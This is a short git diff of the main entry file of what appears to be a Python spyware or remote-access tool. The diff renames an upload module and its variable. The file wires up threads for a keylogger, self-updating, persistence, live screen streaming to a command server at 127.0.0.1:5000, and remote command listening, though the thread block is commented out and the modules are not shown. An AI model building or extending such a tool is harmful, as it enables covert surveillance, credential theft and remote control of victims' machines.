@@ -5,7 +5,7 @@ import self_updater
 import capture_screen
 import get_commands_from_server
 import persistancy
-import server_upload
+import server_communication
 
 def read_config():
     pass
@@ -13,7 +13,7 @@ def read_config():
 if __name__ == '__main__':
     print("HIHIHI")
     #read_config()
-    uploader = server_upload.Server("http://127.0.0.1:5000")
+    server = server_communication.Server("http://127.0.0.1:5000")
     """
     keylogger_thread = threading.Thread(target=keylogger.keylogger, args=())
     keylogger_thread.start()
@@ -22,7 +22,7 @@ if __name__ == '__main__':
     self_updater_thread = threading.Thread(target=self_updater.self_updater, args=())
     self_updater_thread.start()
 
-    live_stream_screen_thread = threading.Thread(target=capture_screen.screen_capture, args=(uploader,))
+    live_stream_screen_thread = threading.Thread(target=capture_screen.screen_capture, args=(server,))
     live_stream_screen_thread.start()
 
     listen_to_commands_from_server_thread = threading.Thread(target=get_commands_from_server.listen, args=())
